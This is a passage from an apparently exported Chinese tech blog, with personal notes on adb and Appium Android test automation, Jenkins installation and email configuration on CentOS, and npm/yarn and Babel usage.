kill-server 关闭服务 #Wifi连接/断开设备 adb tcpip port设置端口如5555(需连接usb) adb connect ip 连接ip设备 adb disconnect ip:port 取消连接ip设备 #重启/关闭设备 adb reboot #重启 adb shell reboot -p #关机 #清除程序数据 adb shell pm clear packageName #程序安装与卸载 adb install ***.apk #安装 adb install -t ***.apk #覆盖安装 adb install -r -t ***.apk #RUN出来的包是test-onlu的安装 adb uninstall packageName #卸载不保留数据 adb uninstall -k packageName #卸载保留数据 #查看已安装的应用 adb shell pm list packages 查看所有应用 adb shell pm list packages -s 查看系统应用 adb shell pm list packages -3 查看三方应用 #查看当前聚焦程序包名、类名 adb shell dumpsys activity | find \"mFocusedActivity\" 安卓≤7（前台运行） adb shell dumpsys activity | find \"mResumedActivity\" 安卓≥8（前台运行程序） #查看apk安装包包名、启动入口、元素探测 aapt dump badging ***.apk #查看apk的包名和启动入口 aapt dump badging ***.apk | find \"package\" #找apk包名 aapt dump badging ***.apk | find \"launchable-activity\" #找apk启动入口 C:\\Users\\Administrator&gt;uiautomatorviewer #启动元素探测bat文件 #监控crash/ANR事件： adb shell am monitor #其它 adb shell dumpsys meminfo PID 内存监控 adb shell \"ip addr | grep global\" 获取设备的IP地址 adb shell am start -W 包名/启动入口 查看启动时间（一般是看冷启动） adb shell wm size 查看屏幕分辨率 adb shell dumpsys battery 读取电量和温度 adb shell dumpsys meminfo 内存使用信息 adb shell input keyevent 26 82(26息屏或唤醒/82菜单键，上滑解锁可以一起用) #keyevent对应值: https://www.cnblogs.com/zhuminghui/p/10470865.html #https://blog.csdn.net/xiezhiming1234/article/details/82117709 通过wifi连接adb 0.首先==个人不推荐wifi连接，不稳定==，如果需要使用需要满足手机和电脑在同一局域网 1.保持usb连接,adb devices能监测到设备 2.==adb tcpip 5555== 确定你的手机和电脑通讯号 3.拔掉usb线，再通过 ==adb connect 手机ip地址==（跟模拟器差不多一个原理，不需要再输端口号了，上面确定过了，手机IP地址，找到wifi,然后找到详细信息里面的地址，需要在局域网内） 4.adb 网络断开设备：==adb disconnect &lt;设备的IP地址&gt;:5555== 即可断开 5.如果多设备连接的情况，需要给每个设备设置不同的tcpip==adb -s822QADU5246SE tcpip 1996====adb -s f06d7a07 tcpip 1997== 如果一直连接不上，回想一下你的设备会在局域网其它电脑里面连接过该设备吗，手机开发者模式—》调试—》撤销usb调试 然后再试下 第二步 adb tcpip 5555 这个输入一次即可（在不撤销usb调试均有效），后面不用usb 直接进入第三步开始连接 ==不要同一部手机同时使用usb和wifi，会出问题== appium简介 Appium 是移动端自动化测试工具，市面上还有很多如 Robotium UIAutomator Native apps（原生应用）：仅使用Android或iOS的标准SDK编写的应用； Web apps（移动浏览器应用）：用移动平台的浏览器访问的应用； Hybrid apps（混合应用）：把一个基于webview实现的功能进行包装的应用。**更多资料** 栏目 Appium Robotium UIAutomator 是否支持跨进程 是 否 是 是否支持跨平台（Android、iOS） 是 否 否 是否支持脚本录制 是 需付费 否 是否支持无源码的APK 是 是 是 支持的编程语言 主流语言均支持 Java Java 支持的应用类型 Native apps、hybrid apps、mobile web apps Native apps、hybrid apps、mobile web apps Native apps、hybrid apps 安装Appium Desktop📌1.安装后首次打开如果为英文版本可调成中文：左上角View—languages—中文 📌2.配置地址和端口后启动 📌注：这个程序个人感觉兼容性很差(当时的版本)，下载的时候找到热度高的版本和对应的位数系统,使用本程序前需要注意以下几点：==打开手机的开发者模式，勾选USB调试== ==手机USB模式不要设置为仅充电== ==通过终端adb devices能监测到设备，并且处于已授权状态== ==尽量不使用wifi模式连接，比较卡== ==部分手机可能需要开启【禁止权限监控】开发者选项–&gt;应用–&gt;禁止权限监控== 安装appium-doctor 这个安装非必选项，主要用于检测哪些配置没有设置的 安装命令：==sudo npm install -g appium-doctor==（Mac） 启动命令：==appium-doctor== 运行启动▶运行 Appium 点击上图的“启动服务器V1.15.1”进入下图后点击启动会话“③” 参数配置1⃣deviceName**:**设备的名称 如果是WIF无线连接的设备名称输入设备ip:port形式 通过adb devices监会出现：2c0d4390 device,如果监测不到证明没有连上设备，确保驱动安装，调试模式都打开 2⃣platformName：设备类型 Android / iOS 3⃣appPackage：获取安装包名&amp;启动入口 4⃣appActivity：启动路径（启动入口，每个APP只有一个入口） Error报错处理Stderr: ‘Security exception: Permission denial: writing to settings 由于未开启权限监控导致开启方法开发者选项–&gt;应用–&gt;✅ 禁止权限监控 报错内容： An unknown server-side error occurred while processing the command. Original error: Error executing adbExec. Original error: ‘Command ‘/usr/local/bin/adb -P 5037 -s f06d7a07 shell settings delete global hidden_api_policy_pre_p_apps’ exited with code 255’; Stderr: ‘Security exception: Permission denial: writing to settings requires:android.permission.WRITE_SECURE_SETTINGS java.lang.SecurityException: Permission denial: writing to settings requires:android.permission.WRITE_SECURE_SETTINGS at com.android.providers.settings.SettingsProvider.enforceWritePermission(SettingsProvider.java:2340) at com.android.providers.settings.SettingsProvider.mutateGlobalSetting(SettingsProvider.java:1405) at com.android.providers.settings.SettingsProvider.deleteGlobalSetting(SettingsProvider.java:1388) at com.android.providers.settings.SettingsProvider.call(SettingsProvider.java:603) at android.content.ContentProvider.call(ContentProvider.java:2162) at android.content.ContentProvider$Transport.call(ContentProvider.java:481) at com.android.providers.settings.SettingsService$MyShellCommand.deleteForUser(SettingsService.java:399) at com.android.providers.settings.SettingsService$MyShellCommand.onCommand(SettingsService.java:281) at android.os.ShellCommand.exec(ShellCommand.java:104) at com.android.providers.settings.SettingsService.onShellCommand(SettingsService.java:49) at android.os.Binder.shellCommand(Binder.java:881) at android.os.Binder.onTransact(Binder.java:765) at android.os.Binder.execTransactInternal(Binder.java:1021) at android.os.Binder.execTransact(Binder.java:994)’; Code: ‘255’ Could not find a connected Android device in 20201ms. An unknown server-side error occurred while processing the command. Original error: Could not find a connected Android device in 20201ms. 电脑在设定时间内找不到设备，一般这种情况下用 ==adb devices== 也找不到设备，这个时候去检查一下 ==开发者选项== ==usb调试== 如果都开启了，那再看下==usb连接后不能设置仅充电== ==电脑是否安装了手机的驱动== 如果没有的话需要安装手机的驱动（高通的cpu可以安装高通的通用版），最终要保证能通过 adb 命令检测到手机 The JAVA_HOME environment variable must be set for Android Tools to work properly 未设置java环境变量 An unknown server-side error occurred while processing the command. Original error: Cannot verify the signature of ‘C:\\Users\\Administrator\\AppData\\Local\\Programs\\Appium\\resources\\app\\node_modules\\appium\\node_modules\\appium-uiautomator2-server\\apks\\appium-uiautomator2-server-v4.21.1.apk’. Original error: The JAVA_HOME environment variable must be set for Android Tools to work properly 通过java javac java -version执行均正常 通过appium-doctor执行也是正常 Injecting to another application requires INJECT_EVENTS permission 未开启USB模拟点击 An unknown server-side error occurred while processing the command. Original error: java.lang.SecurityException: Injecting to another application requires INJECT_EVENTS permission","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"app","slug":"app","permalink":"https://www.adalucky.com/tags/app/"}],"author":"Ada"},{"title":"jenkins","slug":"Auto/Jenkins","date":"2022-02-18T04:21:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/jenkins/","link":"","permalink":"https://www.adalucky.com/auto/jenkins/","excerpt":"Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件项目可以进行持续集成，本文将记录在 Linux环境下安装及配置 Jenkins","text":"Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件项目可以进行持续集成，本文将记录在 Linux环境下安装及配置 Jenkins 参考资料Jenkins&nbsp;下载地址 简介及搭建简介Jenkins是一个用Java编写的开源的持续集成工具。官方网站：https://jenkins.io/Jenkins能实时监控持续集成过程中所存在的问题，提供详细的日志文件和提醒功能，还能用图表的形式，形象地展示项目构建的趋势和稳定性。 目的Jenkins自动化部署可以解决集成、测试、部署等重复性的工作，工具集成的效率明显高于人工操作；并且持续集成可以更早的获取代码变更的信息，从而更早的进入测试阶段，更早的发现问题，这样解决问题的成本就会显著下降：持续集成缩短了从开发、集成、测试、部署各个环节的时间，从而也就缩短了中间出现的等待时间；持续集成也意味着开发、集成、测试、部署得以持续 环境配置环境说明 腾讯云：linux centos7.6 64位 Jenkins版本：2.235.5 Email Extension Plugin版本：2.75 jdk版本：1.8.0_221 git版本：2.28.0 maven版本：3.6.3 allure版本：2.12.1 注：以上除allure外其它程序均安装至linux服务器上，并配置环境变量 安装JDK1.8+下载 JDK 下载地址 官网需要注册登录，不方便的可以自行百度下载，版本不要差太多（当时是运维发的一个 jdk-8u221-linux-x64.tar.gz） 注：jdk需要1.8+ 不然Jenkins可能会出错 上传至服务器本步骤的目的是为了把下载的 jdk 包上传到服务器，这里提供两种方法，也可以通过自己的方法，只要能传上去就行 方式一 通过xftp直接拖取文件（不做演示，因为我没装xftp，哈哈哈） 方式二 通过 linux 命令行方式 上传文件 #cd: 切换目录 #rz: 文件上传（如果提示报错或者找不到是因为没有安装lrzsz输入以下命令安装） #安装lrzsz yum -y install lrzsz 解压 本步骤的目的是将上传的 tar.gz 的包进行解压 #ls:展示当前文件夹内的文件 #tar -xzvf:解压文件名 配置环境变量 :wq（冒号wq）:保存退出 :q(冒号q):直接退出（如果没有修改文件可以直接退出） :q!(冒号q!):强制退出不保存（如果改错了可以用这个） #用vim编辑器打开/etc/profile文件 vim /etc/profile #编辑打开的文件,没有就新增 JAVA_HOME 换成自己刚才解压后的目录 JAVA_HOME=/usr/local/jdk1.8.0_221 JAVA_BIN=$JAVA_HOME/bin JRE_HOME=$JAVA_HOME/jre JRE_BIN=$JRE_HOME/bin PATH=$JAVA_BIN:$JRE_BIN:$PATH CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib export JAVA_HOME JRE_HOME PATH CLASSPATH 让刚才修改的配置立即生效 #让配置立即生效 source /etc/profile #查看java版本 java -version 启动 Jenkins 方法一：服务器安装tomcat,并放置Jenkins.war，启动tomcat 方法二：用java启动（这样就不需要安装和启动tomcat了，省服务器资源 推荐) 方式一 本地解压tomcat，把war包放到webapps内，运行bin目录下的.bat处理文件，这个时候DOS系统会自己跑起来，会先检测到war包，然后配置环境，如果安装启动成功就可以了 方式二 前提是配置好 java 和下载好 jenkins.war 包了 # oohup启动命令 nohup java -jar -Xms512m -Xmx1g -Xmn512m jenkins.war --httpPort=9000 &amp; 访问 Jenkins解锁登录 当我们通过 Tomcat 或者 nohup java -jar 的方式 启动好 jenkins 后便可以开始访问及配置了（如果是本地部署的访问 127.0.0.1 服务器部署的访问对应 ip） 第一次启动有个密码校验，会在 jenkins 的启动日志中有自己找下 以下的图是最开始学 Jenkins的时候截取的，所以是在 windows 上的，但是后面网页上的操作都是一样的所以不重新截图了 IP、端口和启动的保持一致 如果点击保持并完成以后页面出现空白页需要修改jenkins的config配置文件 vim /root/.jenkins/config.xml 升级站点 更换url为：http://mirror.esuni.jp/jenkins/updates/update-center.json 全局环境配置 指定我们的 jdk 的绝对路径（linux也是一样） maven 如果本地有安装就指定，没有安装勾选自动安装（如果没有安装可以点自动安装，截图中的是针对本地已经安装了的） 安装插件 是在是找不到截图了，本步骤的目的就是需要装一些插件，通过这些插件去实现一些 jenkins 没有的功能（如果这些插件装过了就不用管） 安装插件，因为我们要调用svn,邮箱等等服务，必须要依赖插件 安装插件：Maven Integration Groovy Label Assignment HTML Publisher Email Extension Subversion 有可能插件安装不起来，因为你的war包和当前插件版本匹配，可以更新为最新war包 新建项目及配置新增项目 创建一个 maven 项目用来构建我们的工程 源码管理 配置我们的项目源代码的地址及账号密码信息 Build配置 构建触发器 所谓的触发器，就是满足什么条件去自动触发，比如每天早上 7 点开始自动去执行，或者当我们自己的 git 仓库或者开发的 git 仓库发生了 push 提交代码 时间表达式：*/5 * * * * 一共5个值 Minute：分钟值 （0-59） Hour ：时钟值 （0-23） Dom ：日期 （1-31） Month ：月份 （1-12） Dow ： 一周中的某一天（0-7），0和7都代表的是礼拜天 每个字段的值还可以单独配置 *：所有的值 如果在分钟数就是每分钟，日期值上就是每天 M-N :指定一个范围区间的值 如果在分钟值上，就是0-10分钟之间 M-N/X : 1-30/5(如果在分钟数就可以理解为1-30分钟的时候每隔5分钟) */x： */5 如果在分钟值就是每隔5分钟，时钟值就是每隔5小时 邮件配置 配置邮箱的目的是为了让我们项目构建后给我们发邮件通知我们构建成功与否 发邮件需要装 Email Extension Plugin 插件 获取smtp服务密码步骤 QQ邮箱为例 进入QQ邮箱主页，点击设置 找到“账户”页签，在开启服务下面，找到IMAP/SMTP服务对应的“开启”按钮点击，然后–》申请密保 按照弹窗里的提示给腾讯发送短信，你就会收到一个授权码，这个就是密码（记得先保存好授权码） 邮件信息配置 配置系统管理员的邮箱 发件人的邮箱 收件人的邮件 如果邮箱发生用问题可在构建的控制台输出中 debug里面看日志 构建后操作 我们期望构建后给我们发邮件，上面配置的只是发件人的，现在要配置接收人的邮箱账号 当时我出现过按照老师的教程配置了控制台也提示邮件发送成功，但是就是收不到最后一番折腾：https://issues.jenkins-ci.org/browse/JENKINS-34731 报告模板 以下为格式：点击即可注意测试报告这个地方http://49.234.62.82:9090/job/tb_api_auto/allure/ 最后这个斜杠带上，不然会调制登陆页面 &lt;hr&gt; (本邮件是程序自动下发的，请勿回复！)&lt;br&gt;&lt;hr&gt; 项目名称：$PROJECT_NAME&lt;br&gt;&lt;hr&gt; 构建编号：$BUILD_NUMBER&lt;br&gt;&lt;hr&gt; 构建状态：$BUILD_STATUS&lt;br&gt;&lt;hr&gt; 触发原因：${CAUSE}&lt;br&gt;&lt;hr&gt; 测试报告：&lt;a href=\"http://49.234.62.82:9090/job/tb_api_auto/allure\"&gt;http://49.234.62.82:9090/job/tb_api_auto/allure/&lt;/a&gt; &lt;br&gt;&lt;hr&gt; 构建日志地址：&lt;a href=\"${BUILD_URL}console\"&gt;${BUILD_URL}console/&lt;/a&gt;&lt;br&gt;&lt;hr&gt; 构建地址：&lt;a href=\"$BUILD_URL\"&gt;$BUILD_URL&lt;/a&gt;&lt;br&gt;&lt;hr&gt; 构建报告：&lt;a href=\"${BUILD_URL}testReport\"&gt;${BUILD_URL}testReport/&lt;/a&gt;&lt;br&gt;&lt;hr&gt; 变更集:${JELLY_SCRIPT,template=\"html\"}&lt;br&gt;&lt;hr/&gt; 扩展公司网络匿名访问 在我们发出的邮件中往往有很多的资源，提供公司的其它人员访问例如我们配置在邮件里面的allure报表,pom，日志等以下内容，但是访问需要对方登陆 理论上来说是合理的，登录校验，但是有些领导他可能不需要这个账号，或者只是自己在用没给别人建立账号 于是我们就必须去权限控制里面开启匿名用户的read权限，但是这样又会存在一定的风险性，于是通过访问权限控制+服务器安全组策略进行控制 匿名访问只是针对一部分功能的查看权限，执行权限必须要登录的 开启匿名访问权限 Jenkins首页—&gt;Manage Jenkins—-&gt;Security—&gt;Configure Global Security 服务器安全组配置 设定只允许公司的IP访问 上面我们已经实现了匿名用户的访问读取权限，但是我们又不想完全的暴露在互联网上，解决办法就是给服务器设置安全组，针对这个端口只允许固定的ip访问，这样就能保证只有你们公司的人才能看到了当然，你自己回到家也看不了，那么就把家里的ip也配置上吧（我这里就以我腾讯云的服务器为例） Linux开机自启Jenkins 这里做的是通过 java -jar 方式直接启动的，如果是 tomcat 的话原理一样的，改成开机自动启动 tomcat，然后就相当于启动了 jenkins #进入etc/rc.local后添加启动命令 （确保该文件有执行权限X） vim /etc/rc.local #jenkins开机启动 /ada/jenkins---jenkins.war包所在位置 cd /ada/jenkins &amp;&amp; nohup java -jar -Xms600m -Xmx1g -Xmn512m jenkins.war --httpPort=9090 &amp; #重启服务器 reboot #查看服务是否启动成功 ps -ef|grep jenkins #出现如下表示成功 [root@VM_0_16_centos jenkins]# ps -ef|grep jenkins root 1025 1024 3 16:58 ? 00:00:28 java -jar -Xms600m -Xmx1g -Xmn512m jenkins.war --httpPort=9090 root 3602 1852 0 17:13 pts/1 00:00:00 grep --color=auto jenkins #情况二：如果开机启动不成功，复制我们cd /ada/jenkins.....这条命令在外面任意位置看是否能启动成功，如果启动成功表示命令没有问题 1.然后检查我们格式是否有问题 2.添加java软连接：ln -s /ada/java/jdk1.8.0_221/bin/* /usr/bin/ ----/ada/java/jdk1.8.0_221(java的安装路径/bin/*就是把里面所有的命令都添加到/user/bin里面) 3.echo $PATH查看 [root@VM_0_16_centos ~]# echo $PATH /ada/java/jdk1.8.0_221/bin:/ada/java/jdk1.8.0_221/jre/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/ada/java/jdk1.8.0_221/bin:/ada/maven/apache-maven-3.6.3/bin:/usr/local/git/bin:/ada/allure/package/bin:/root/bin [root@VM_0_16_centos ~]# ln -s /ada/java/jdk1.8.0_221/bin/* /usr/bin/Connection closing...Socket close. #reboot重启应该就能开机自动启动了","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"jenkins","slug":"jenkins","permalink":"https://www.adalucky.com/tags/jenkins/"}],"author":"Ada"},{"title":"npm","slug":"Auto/npm","date":"2022-02-04T06:14:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/npm/","link":"","permalink":"https://www.adalucky.com/auto/npm/","excerpt":"npm全称node package manager，是node包管理和分发工具。可以理解为前端的maven。通过npm可以很方便的下载js库，管理前端工程。node已经集成npm工具，在cmd中输入npm -v查看当前npm版本。","text":"npm全称node package manager，是node包管理和分发工具。可以理解为前端的maven。通过npm可以很方便的下载js库，管理前端工程。node已经集成npm工具，在cmd中输入npm -v查看当前npm版本。 参考资料 认识 npm发展简介 npm：npm是一个JavaScript的包管理程序（Node Package Manager）—&gt;类似与java的maven npm的由来：当一个项目依赖的代码越来越多，程序员发现这是一件很麻烦的事情： 我要去哪里下载我要的第三方依赖？ 我要用什么版本？ 如何更新我已经使用的第三方依赖？ 等等。。。。。。 有些程序员就受不鸟了，一个拥有三大美德的程序员 Isaac Z. Schlueter （以下简称 Isaaz）给出了一个解决方案：用一个工具把这些代码集中到一起来管理吧！这个工具就是他用 JavaScript （运行在 Node.js 上）写的 npm，全称是 Node Package Manager 介绍 npm（全称Node Package Manager，即node包管理器） 是Node.js默认的、以JavaScript编写的软件包管理系统 npm 来分享和使用代码已经成了前端的标配 官网： https://www.npmjs.com npm被全球超过1100万开发人员所依赖 拥有超过一百万个软件包，是世界上最大的软件注册表 npm的思路大概是这样的： 买个服务器作为代码仓库（repository），在里面放所有需要被共享的代码 发邮件通知 jQuery 、Bootstrap 、Underscore 的作者使用 npm publish 把代码提交到 repository 上，分别取名 jquery、bootstrap 和 underscore（注意大小写） 社区里的其他人如果想使用这些代码，就把 jquery、bootstrap 和 underscore 写到 package.json 里，然后运行 npm install ，npm 就会帮他们下载代码 下载完的代码出现在 node_modules 目录里，就可以随意使用了。这些可以被使用的代码被叫做「包」（package），这就是 npm名字的由来：Node Package(包) Manager(管理器)。 安装 npm npm是Node.js默认的软件包管理系统 安装完毕node后，会默认安装好npm npm本身也是基于Node.js开发的软件 下载Node: http://nodejs.cn/download/ 下载对应的安装包进行安装 npm 的发展是跟 node.js 的发展相辅相成的。node.js 是由一个在德国工作的美国程序员 Ryan Dahl 写的。他写了 node.js，但是 node.js 缺少一个包管理器，于是他和npm的作者一拍即合、抱团取暖，最终 node.js 内置了 npm 使用 npm工具管理包点击显/隐代码块 #查看node版本 ada@ASUS:~$ node -v v14.15.4 #查看npm版本（如果查看不到：linux可能需要ln -s建立软链接，windows需要配置环境变量） #ada@ASUS:~$ ln -s [源文件或目录] [目标文件或目录] #ada@ASUS:~$ ln -s /home/ada/software/programming/node/node-v14.15.4-linux-x64/bin /usr/local/bin/npm ada@ASUS:~$ npm -v 7.6.3 #设置淘宝镜像并查看镜像源 #方式一：cnpm npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm config get registry #方式二：npm npm config set registry npm config get registry #方式三：使用nrm工具切换镜像源 npx nrm use taobao（换淘宝源） npx nrm use npm (换回官方源) npm config get registry （查看当前镜像源） #安装vue-cli（默认是最新版本） npm install -g @vue/cli vue --version #安装/升级npm -g(全局安装) npm -g install npm@5.9.1 （@后跟版本号可以指定npm版本） ada@ASUS:~$ npm install npm -g #安装模块[可选参数：-g，全局安装 Module Name@版本号指定版本安装，默认安装最新版本 ] npm install &lt;Module Name&gt;[@版本号] [-g] #更新模块 npm update &lt;Module Name&gt; [-g] #卸载模块 npm uninstall &lt;Module Name&gt; #运行时依赖,-save参数指定后会在package.json文件中：dependencies节点下写入依赖（不加save默认也是开发时依赖） npm install -save &lt;Module Name&gt; #开发时依赖，-save-dev参数指定后会在package.json文件中：devDependencies节点下写入依赖，开发时候需要的环境，上线不需要的比如压缩代码这些依赖 npm install -save-dev &lt;Module Name&gt; #查看所有全局安装的模块 npm list -g #查看某个模块版本(需要先进入该项目路径) npm list &lt;Module Name&gt; #初始化package.json文件[--yes 参数值默认配置，不加需要手动自命名或者自行再修改] npm init [--yes] #清空本地缓存（删除删除node_modules包、删除package.json.lock） 使用npm cache clear可以清空NPM本地缓存，用于对付使用相同版本号发布新版本代码的人。 sudo npm cache clean --force npm cache verify #使用npm unpublish &lt;package&gt;@&lt;version&gt;可以撤销发布自己发布过的某个版本代码。 *注:*安装Node时默认安装npm 需要安装包时先进入项目根路径然后通过npm install 进行安装，安装时自动递归创建node_modules文件夹和包文件夹 devDependencies：开发时的依赖，里面的模块都是开发时候用的，发布发到正式环境以后就用不到它了，比如项目中使用的测试模块，调试的一些东西还有gulp,压缩css、js的module dependencies:运行时的依赖，发布后即在生产环境还是需要用到的模块 不加-save参数默认是开发时依赖 package.json#生成 package.json 文件（加 --yes 参数即为赋予默认值，不加的话也可以一个个参数进行设置，可用 默认值然后去 package.json 文件中再次修改） npm init --yes #参数详解 name - 包名。 version - 包的版本号。 description - 包的描述。 homepage - 包的官网 url 。 author - 包的作者姓名。 contributors - 包的其他贡献者姓名。 dependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。 repository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。 main - main 字段指定了程序的主入口文件，require('moduleName') 就会加载这个文件。这个字段的默认值是模块根目录下面的 index.js。 keywords - 关键字 #scripts 节点 vue下的scripts 可通过子节点名设置对应执行的命令如：npm run dev 实际执行的就是vue-cli-service serve，可自行修改 \"scripts\": { \"dev\": \"vue-cli-service serve\", \"build\": \"vue-cli-service build\" } #版本（启动项目npm install 的时候会去生成锁文件，锁定版本） ~4.5.X 安装4.5中的最大版本 ^4.X.X 安装4中的最大版本 4.5.1 安装4.5.1版本 模块的基本应用 没有webpack之前搜寻整个 node_modules 目录来定位每个包的路径再手动添加到我们 HTML 文件中（实在太太不方便了,示例如下 先引入路径后使用模块） &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;测试&lt;/title&gt; &lt;!-- 引入模块--&gt; &lt;script src=\"./node_modules/jquery/dist/jquery.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!--使用模块--&gt; &lt;script&gt; $(function () { }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 大多数编程语言都会提供从一个文件导入另一个文件代码的机制。然而 JavaScript 最初设计时并没有这个特性，因为 JavaScript 原本是为了在浏览器端运行而设计的，并没有权限获取计算机客户端的文件系统（安全考虑）。所以很长一段时间以来，组织多个文件的 JavaScript 代码就是把每个文件下载下来，变量是全局共享的。 CommonJS 中很大的一部分便是对模块系统的规范， 使用require语句导入包 （新的ES6可以使用import导入包） npm 和 yarn 的对比及迁移简介 官网：www.yarnpkg.com Yarn是由Facebook、Google、Exponent 和 Tilde 联合推出了一个新的 JS 包管理工具 ，正如官方文档中写的，Yarn 是为了弥补 npm 的一些缺陷而出现的。因为NPM5以下会出现下面的问题： npm install的时候巨慢。特别是新的项目拉下来要等半天，删除node_modules，重新install的时候依旧如此。 同一个项目，多人开发时，由于安装的版本不一致出现bug 安装 方式一：下载node.js，使用npm安装 npm install -g yarn 查看版本：yarn –version 方式二：下载yarn的安装程序:提供一个.msi文件，在运行时将引导您在Windows上安装Yarn Yarn 淘宝源安装，分别复制粘贴以下代码行到黑窗口运行即可 yarn config set registry https://registry.npm.taobao.org -g yarn config set sass_binary_site http://cdn.npm.taobao.org/dist/node-sass -g 基本使用yarn init //初始化项目 同npm init，执行输入信息后，会生成package.json文件 yarn install //安装package.json里所有包，并将包及它的所有依赖项保存进yarn.lock yarn install --flat //安装一个包的单一版本 yarn install --force //强制重新下载所有包 yarn install --production //只安装dependencies里的包 yarn install --no-lockfile //不读取或生成yarn.lock yarn install --pure-lockfile //不生成yarn.lock yarn add [package] // 在当前的项目中添加一个依赖包，会自动更新到package.json和yarn.lock文件中 yarn add [package]@[version] // 安装指定版本，这里指的是主要版本，如果需要精确到小版本，使用-E参数 yarn add [package]@[tag] // 安装某个tag（比如beta,next或者latest） yarn add --dev/-D // 加到 devDependencies yarn add --peer/-P // 加到 peerDependencies yarn add --optional/-O // 加到 optionalDependencies //默认安装包的主要版本里的最新版本，下面两个命令可以指定版本： yarn add --exact/-E // 安装包的精确版本。例如yarn add foo@1.2.3会接受1.9.1版，但是yarn add foo@1.2.3 --exact只会接受1.2.3版 yarn add --tilde/-T //安装包的次要版本里的最新版。例如yarn add foo@1.2.3 --tilde会接受1.2.9，但不接受1.3.0 发布包 yarn publish 移除一个包 yarn remove &lt;packageName&gt; 会自动更新package.json和yarn.lock 更新一个依赖 yarn upgrade 用于更新包到基于规范范围的最新版本 运行脚本 yarn run 用来执行在 package.json 中 scripts 属性下定义的脚本 显示某个包的信息 yarn info &lt;packageName&gt; 可以用来查看某个模块的最新版本信息 缓存 yarn cache yarn cache list # 列出已缓存的每个包 yarn cache dir # 返回 全局缓存位置 yarn cache clean # 清除缓存 优点 速度快 安装版本统一 更简洁的输出 多注册来源处理 更好的语义化 npm 迁移值 yarn 可以从npm迁移到yarn，也可以从yarn迁移到npm。 有了yarn的压力之后，npm做了一些类似的改进，在npm5.0之前，yarn的优势特别明显。但是在npm之后，通过以上一系列对比，我们可以看到 npm5 在速度和使用上确实有了很大提升，值得尝试。 如果你已经在个人项目上使用 yarn，并且没有遇到更多问题，目前完全可以继续使用。但如果有兼容 npm 的场景，以及还没有切到 yarn 的项目，那现在就可以试一试 npm5 了。 实践解决 ES6 兼容问题 ES6 的语法对于有些老的浏览器不兼容 比如定义变量 const let 这些标识符 无法识别，需要转换成 ES5 的语法，一般有在线解决和提前编译两种方案 比较通用的工具方案有babel，jsx，traceur，es6-shim等 兼容表：http://kangax.github.io/compat-table/es6/ IE10+、Chrome、FireFox、移动端、NodeJS现在都支持 方式一：在线解决（客户端）❌在线转换（通过工具包的方式，这种编译会加大页面渲染的时间,不推荐） 在script 中引入 babel-core 的 js 文件 body 中注意声明 type=\"text/babel\" &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;测试页面&lt;/title&gt; &lt;script src=\"\"&gt;&lt;/script&gt; &lt;script src=\"https://lib.baomitu.com/babel-core/5.8.38/browser.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script type=\"text/babel\"&gt; const name = \"this is ada\"; console.log(name); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 方式二：提前编译（服务端）⭕提前编译（强烈建议这种方式，不影响浏览器渲染时间） 安装依赖 # 开发环境依赖安装 babel-cli sudo npm install -save-dev babel-cli #环境验证 6.26.0 (babel-core 6.26.3) babel -V 项目根路径新建.babelrc 文件 { \"presets\": [\"es2015\", \"stage-2\"], //设置转码规则 \"plugins\": [\"transform-runtime\"] //设置插件 } 安装 es2015 对应的库 # \"presets\": [\"es2015\", \"stage-2\"] 上面转码规则设置的 es2015 因此需要安装对应的依赖 npm install babel-core babel-preset-es2015 babel-plugin-transform-runtime babel-preset-stage-2 -save-dev 绑定命令 # package.json 文件中scripts标签新增一条指令 通过运行 npm run babel 即可把 src 目录下的文件 编译到 babelSrc 下 \"scripts\": { \"babel\": \"babel src -w -d babelSrc\" } 编译整个 src 目录并将其输出到 babelSrc 目录。这里的src指的是需要转换的目录，babelSrc指的是输出的内容的存放目录，-w其实是-watch的意思，就是监听文件，实时编译输出新建src目录和babelSrc目录，记得一定要建，不然会报错，然后我们启动我们的babel工程。命令行输入npm run babel","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"前端基础","slug":"前端基础","permalink":"https://www.adalucky.com/tags/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/"},{"name":"npm","slug":"npm","permalink":"https://www.adalucky.com/tags/npm/"},{"name":"yarn","slug":"yarn","permalink":"https://www.adalucky.com/tags/yarn/"}],"author":"Ada"},{"title":"springboot 2.X","slug":"Auto/springboot","date":"2022-01-27T04:26:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/auto/springboot/","link":"","permalink":"https://www.adalucky.com/auto/springboot/","excerpt":"SpringBoot它基于Spring4.0设计，是由 Pivotal 公司提供的框架。 SpringBoot 基于 Spring 开发。不仅继承了Spring框架原有的优秀特性，它并不是用来替代 Spring 的解决方案，而和 Spring 框架紧密 结合进一步简化了Spring应用的整个搭建和开发过程。其设计目的是用来简化 Spring 应用的初始搭建以及开发过程怎么简化的呢？就是 通过提供默认配置等方式让我们更容易使用。","text":"SpringBoot它基于Spring4.0设计，是由 Pivotal 公司提供的框架。 SpringBoot 基于 Spring 